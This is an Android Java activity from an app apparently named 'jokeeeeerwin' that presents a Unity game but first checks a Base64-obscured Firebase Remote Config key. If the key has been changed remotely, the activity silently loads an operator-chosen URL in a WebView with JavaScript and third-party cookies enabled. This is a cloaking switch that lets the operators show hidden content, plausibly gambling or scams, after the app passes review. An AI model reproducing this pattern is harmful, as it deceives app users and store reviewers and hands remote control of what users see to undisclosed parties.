package com.jokeeeeerwin.in.app.win_main;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.ProgressBar;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.jokeeeeerwin.in.app.R;
import com.jokeeeeerwin.in.app.win_const.WinInConst;
import com.jokeeeeerwin.in.app.win_reciever.WinInReciever;
import com.jokeeeeerwin.in.app.win_webs.WinInChromeClient;
import com.jokeeeeerwin.in.app.win_webs.WinInWebClient;
import com.unity3d.player.UnityPlayerActivity;

public class WinView extends AppCompatActivity {

    FirebaseRemoteConfig win_FirebaseRemoteConfig;
    ProgressBar win_ProgressBar;
    WebView win_WebView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.win_view);

        win_ProgressBar = findViewById(R.id.win_progress);
        win_WebView = findViewById(R.id.win_view);

        win_FirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings win_FirebaseRometeConfigSettings = new FirebaseRemoteConfigSettings.Builder().build();
        win_FirebaseRemoteConfig.setDefaultsAsync(R.xml.win_url);
        win_FirebaseRemoteConfig.setConfigSettingsAsync(win_FirebaseRometeConfigSettings);


        try {
            Thread.sleep(1500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        if(!win_FirebaseRemoteConfig.getString(new String(android.util.Base64.decode("d2luX3VybA==", Base64.DEFAULT)))
                .equals(new String(Base64.decode("d2luX3VybA==", Base64.DEFAULT))))
        {
            CookieManager win_CookieManager = CookieManager.getInstance();
            CookieManager.setAcceptFileSchemeCookies(true);
            win_CookieManager.setAcceptThirdPartyCookies(win_WebView, true);

            win_WebView.getSettings().setJavaScriptEnabled(true);
            win_WebView.getSettings().setSupportZoom(true);
            win_WebView.getSettings().setBuiltInZoomControls(false);
            win_WebView.getSettings().setLoadWithOverviewMode(true);
            win_WebView.getSettings().setDomStorageEnabled(true);
            win_WebView.getSettings().setUseWideViewPort(true);
            win_WebView.getSettings().setLoadsImagesAutomatically(true);
            win_WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            win_WebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            win_WebView.setBackgroundColor(Color.WHITE);
            win_WebView.loadUrl(win_FirebaseRemoteConfig.getString(new String(Base64.decode("d2luX3VybA==", Base64.DEFAULT))));

            win_WebView.setWebViewClient(new WinInWebClient());
            win_WebView.setWebChromeClient(new WinInChromeClient(this, win_ProgressBar));

            WinInReciever winInReciever = new WinInReciever(win_WebView);
            IntentFilter winIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            winIntentFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
            registerReceiver(winInReciever, winIntentFilter);

        }
        else {
            Intent i = new Intent(this, UnityPlayerActivity.class);
            startActivity(i);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode == WinInConst.reqCode)
            if (WinInConst.winCallBac == null) return;

        if (resultCode != RESULT_OK) {
            WinInConst.winCallBac.onReceiveValue(null);
            return;
        }

        Uri winResult = (data == null) ? WinInConst.winUrl : data.getData();

        if (winResult != null && WinInConst.winCallBac != null)
            WinInConst.winCallBac.onReceiveValue(new Uri[]{winResult});
        else if (WinInConst.winCallBac != null)
            WinInConst.winCallBac.onReceiveValue(new Uri[]{WinInConst.winUrl});
        WinInConst.winCallBac = null;
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onBackPressed() {
        if(win_WebView.canGoBack()) win_WebView.goBack();
    }
}